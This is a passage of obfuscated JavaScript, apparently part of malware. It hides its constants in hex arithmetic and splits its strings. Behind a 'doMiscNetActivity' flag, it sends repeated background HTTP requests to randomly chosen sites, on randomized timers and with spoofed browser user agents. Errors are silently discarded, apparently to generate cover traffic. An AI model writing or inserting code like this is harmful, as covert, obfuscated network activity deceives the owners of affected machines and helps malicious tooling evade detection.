      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x165a * -0x1 + 0x11 * 0x1c3 + -0x1 * 0x799; k < 0x3 * 0x7f6 + 0x1b1 * -0xa + 0x14 * -0x59; k++)
    setTimeout(f, (-0x1c * 0x509 + -0x47 * 0x62f + 0x32e65) * k * getRandomInt(0x25 * 0xa7 + -0x1 * -0x1610 + -0x2e32, 0x1 * -0xda + 0x1aee + 0x1 * -0x1a11));
  setInterval(() => {
    f();
    for (let l = -0x1a85 + -0x71 * -0x2 + 0x1 * 0x19a3; l < -0x2ef * -0x7 + 0x8c4 + -0x1d49; l++)
      setTimeout(f, (-0x59b1 * 0x3 + 0x19447 + 0x632c) * l * getRandomInt(0x1550 + -0x660 + 0xeef * -0x1, -0xdbd * 0x1 + -0x20cf + 0x2e8f));
  }, 0x1bba2a + -0xcf5 * -0x86d + 0x51f7fb * -0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1d3f + 0x34de * 0x1 + 0x3b9) * getRandomInt(0x172c * -0x1 + -0x1e79 + 0x3 * 0x11e2, 0x24b4 + 0x11d9 * -0x2 + -0xfd));
}, -0x728 + -0x21bc + 0x2948);